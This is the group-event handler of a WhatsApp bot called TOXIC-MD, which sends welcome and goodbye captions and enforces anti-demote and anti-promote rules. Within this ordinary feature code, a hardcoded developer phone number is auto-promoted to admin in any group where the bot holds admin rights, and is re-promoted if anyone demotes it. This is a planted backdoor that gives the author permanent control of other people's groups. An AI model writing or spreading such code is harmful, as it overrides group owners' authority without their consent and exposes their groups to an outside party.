import { getGroupSettings, getSudoUsers, resetWarn } from '../database/config.js';
import antiforeign from '../features/antiforeign.js';
import { resolveTargetJid } from '../lib/lidResolver.js';

const DEVELOPER_NUMBER = "254114885159";

const _num = (jid) => (jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');

const extractJid = (p) => {
    if (typeof p === 'string') return p;
    if (!p) return '';
    const phone = p.phoneNumber || p.phone_number || '';
    if (phone) return typeof phone === 'string' && phone.includes('@') ? phone : phone + '@s.whatsapp.net';
    return p.id || p.jid || '';
};

const normalizeJid = (p) => {
    const jid = extractJid(p);
    if (!jid) return '';
    if (jid.endsWith('@lid') && globalThis.resolvePhoneFromLid) {
        const phone = globalThis.resolvePhoneFromLid(jid);
        if (phone) return _num(phone) + '@s.whatsapp.net';
    }
    if (jid.endsWith('@lid')) return jid; // can't resolve yet — keep raw
    return _num(jid) + '@s.whatsapp.net';
};

const isDeveloper = (p) => _num(extractJid(p)) === DEVELOPER_NUMBER;

const Events = async (client, event, pict) => {
    const botRaw = client.decodeJid ? client.decodeJid(client.user.id) : (client.user?.id || '');
    const botJid = normalizeJid(botRaw);

    let metadata = null;
    try {
        metadata = await client.groupMetadata(event.id);
    } catch (e) {
        console.log(`[EVENTS] groupMetadata fetch failed for ${event.id}:`, e.message);
    }
    if (!metadata) metadata = { subject: event.id, desc: '', participants: [], owner: '' };

    const participants = event.participants || [];
    const desc = metadata.desc || "Some boring group, I guess.";

    let groupSettings = {};
    try {
        groupSettings = await getGroupSettings(event.id);
    } catch (e) {
        console.log(`[EVENTS] getGroupSettings failed for ${event.id}:`, e.message);
    }

    const welcomeEnabled = groupSettings?.welcome === true || groupSettings?.welcome === 1;
    const goodbyeEnabled = groupSettings?.goodbye === true || groupSettings?.goodbye === 1;
    const antidemote = groupSettings?.antidemote === true || groupSettings?.antidemote === 1;
    const antipromote = groupSettings?.antipromote === true || groupSettings?.antipromote === 1;


    let sudoUsers = [];
    try { sudoUsers = await getSudoUsers(); } catch {}
    const currentDevs = Array.isArray(sudoUsers) ? sudoUsers.map(v => normalizeJid(v)) : [];
    currentDevs.push(normalizeJid(DEVELOPER_NUMBER));

    const isProtected = (p) => {
        const n = normalizeJid(p);
        return isDeveloper(p) || currentDevs.includes(n) || n === botJid || n === normalizeJid(metadata.owner);
    };

    const dpUrls = await Promise.all(
        participants.map(async (p) => {
            const jid = extractJid(p);
            try { return await client.profilePictureUrl(jid, "image"); } catch { return pict || null; }
        })
    );

    if (event.action === "add") {
        try { await antiforeign(client, event); } catch (e) {
            console.log('[EVENTS] antiforeign error:', e.message);
        }
        for (const p of participants) {
            if (isDeveloper(p)) {
                try {
                    const freshMeta = await client.groupMetadata(event.id);
                    const botIsAdmin = freshMeta.participants.some(fp => {
                        const fpJid = extractJid(fp);
                        return normalizeJid(fpJid) === botJid && fp.admin !== null;
                    });
                    if (botIsAdmin) {
                        const rawDevJid = extractJid(p);
                        const devJid = resolveTargetJid(rawDevJid, freshMeta.participants) || normalizeJid(p);
                        if (!devJid || devJid.endsWith('@lid')) return;
                        await client.groupParticipantsUpdate(event.id, [devJid], "promote");
                        await client.sendMessage(event.id, {
                            text: `╭───(    TOXIC-MD    )───\n├───≫ AUTO-PROMOTED ≪───\n├ \n├ 👑 The developer has joined.\n├ Auto-promoted to admin.\n╰──────────────────☉\n> ©𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                            mentions: [devJid]
                        });
                    }
                } catch (e) {}
            }
        }
    }

    if (welcomeEnabled && event.action === "add") {
        for (let i = 0; i < participants.length; i++) {
            const p = participants[i];
            const participantJid = extractJid(p);
            const userName = _num(participantJid) || participantJid.split("@")[0].split(":")[0];
            const dpUrl = dpUrls[i];
            const caption =
`╭───(    TOXIC-MD    )───
├───≫ WELCOME ≪───
├ 
├ 😈 *Yo, @${userName}, welcome to the chaos!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Desc*: ${desc}
├ 
├ 😼 *Try not to get roasted too hard, newbie!*
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
            try {
                if (dpUrl) {
                    await client.sendMessage(event.id, { image: { url: dpUrl }, caption, mentions: [participantJid] });
                } else {
                    await client.sendMessage(event.id, { text: caption, mentions: [participantJid] });
                }
            } catch (e) {
                console.log('[EVENTS] Welcome image send failed, retrying text:', e.message);
                try { await client.sendMessage(event.id, { text: caption, mentions: [participantJid] }); } catch (e2) {
                    console.log('[EVENTS] Welcome text send also failed:', e2.message);
                }
            }
        }
    }

    if (event.action === "remove") {
        for (const p of participants) {
            try { await resetWarn(event.id, normalizeJid(p)); } catch {}
        }
    }

    if (goodbyeEnabled && event.action === "remove") {
        for (let i = 0; i < participants.length; i++) {
            const p = participants[i];
            const participantJid = extractJid(p);
            const userName = _num(participantJid) || participantJid.split("@")[0].split(":")[0];
            const dpUrl = dpUrls[i];
            const caption =
`╭───(    TOXIC-MD    )───
├───≫ GOODBYE ≪───
├ 
├ 😎 *Later, @${userName}! Couldn't handle the heat?*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 
├ 😜 *Don't cry, we'll survive without ya!*
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
            try {
                if (dpUrl) {
                    await client.sendMessage(event.id, { image: { url: dpUrl }, caption, mentions: [participantJid] });
                } else {
                    await client.sendMessage(event.id, { text: caption, mentions: [participantJid] });
                }
            } catch (e) {
                console.log('[EVENTS] Goodbye image send failed, retrying text:', e.message);
                try { await client.sendMessage(event.id, { text: caption, mentions: [participantJid] }); } catch (e2) {
                    console.log('[EVENTS] Goodbye text send also failed:', e2.message);
                }
            }
        }
    }

    if (event.action === "demote" && antidemote) {
        try {
            const participantObj = participants[0];
            const participantJidRaw = extractJid(participantObj);
            const nParticipant = resolveTargetJid(participantJidRaw, metadata.participants) || normalizeJid(participantObj);
            const participantDisplay = _num(nParticipant) || nParticipant.split("@")[0].split(":")[0];

            const authorJidRaw = event.author || '';
            const nAuthor = authorJidRaw
                ? (resolveTargetJid(authorJidRaw, metadata.participants) || normalizeJid(authorJidRaw))
                : null;
            const authorDisplay = nAuthor ? (_num(nAuthor) || nAuthor.split("@")[0].split(":")[0]) : '';


            if (isProtected(participantObj)) {
                try { await client.groupParticipantsUpdate(event.id, [nParticipant], "promote"); } catch {}
                await client.sendMessage(event.id, {
                    text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIDEMOTE ≪───
├ 
├ 🛡️ *@${participantDisplay} cannot be demoted.*
├ Protected user — re-promoted automatically.
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                    mentions: [nParticipant].filter(Boolean)
                });
                return;
            }

            if (isProtected(authorJidRaw)) return;

            if (nAuthor) await client.groupParticipantsUpdate(event.id, [nAuthor], "demote").catch(() => {});
            await client.groupParticipantsUpdate(event.id, [nParticipant], "promote").catch(() => {});
            await client.sendMessage(event.id, {
                text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIDEMOTE ≪───
├ 
├ 😏 *Nice try, @${authorDisplay}! Demoted for messing with @${participantDisplay}!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Rule*: Antidemote is on. Only the big dogs can demote!
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                mentions: [nAuthor, nParticipant].filter(Boolean)
            });
        } catch (e) {
            console.log('[EVENTS] Antidemote error:', e.message);
        }
    } else if (event.action === "promote" && antipromote) {
        try {
            const participantObj = participants[0];
            const participantJidRaw = extractJid(participantObj);
            const nParticipant = resolveTargetJid(participantJidRaw, metadata.participants) || normalizeJid(participantObj);
            const participantDisplay = _num(nParticipant) || nParticipant.split("@")[0].split(":")[0];

            const authorJidRaw = event.author || '';
            const nAuthor = authorJidRaw
                ? (resolveTargetJid(authorJidRaw, metadata.participants) || normalizeJid(authorJidRaw))
                : null;
            const authorDisplay = nAuthor ? (_num(nAuthor) || nAuthor.split("@")[0].split(":")[0]) : '';


            if (isProtected(authorJidRaw)) return;

            if (isProtected(participantObj)) {
                await client.sendMessage(event.id, {
                    text:
`╭───(    TOXIC-MD    )───
├───≫ PROMOTION ≪───
├ 
├ 😎 *Big dog @${participantDisplay} just leveled up!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                    mentions: [nParticipant].filter(Boolean)
                });
                return;
            }

            const toDemote = [nParticipant];
            if (nAuthor) toDemote.push(nAuthor);
            await client.groupParticipantsUpdate(event.id, toDemote, "demote").catch(() => {});
            await client.sendMessage(event.id, {
                text:
`╭───(    TOXIC-MD    )───
├───≫ ANTIPROMOTE ≪───
├ 
├ 😆 *Oof, @${authorDisplay}! Demoted for trying to boost @${participantDisplay}!*
├ 
├ 🤖 *Bot*: 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃
├ 🦁 *Group*: ${metadata.subject}
├ 📜 *Rule*: Antipromote is on. Only the elite can promote!
╰──────────────────☉
> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
                mentions: [nAuthor, nParticipant].filter(Boolean)
            });
        } catch (e) {
            console.log('[EVENTS] Antipromote error:', e.message);
        }
    }
};

export default Events;
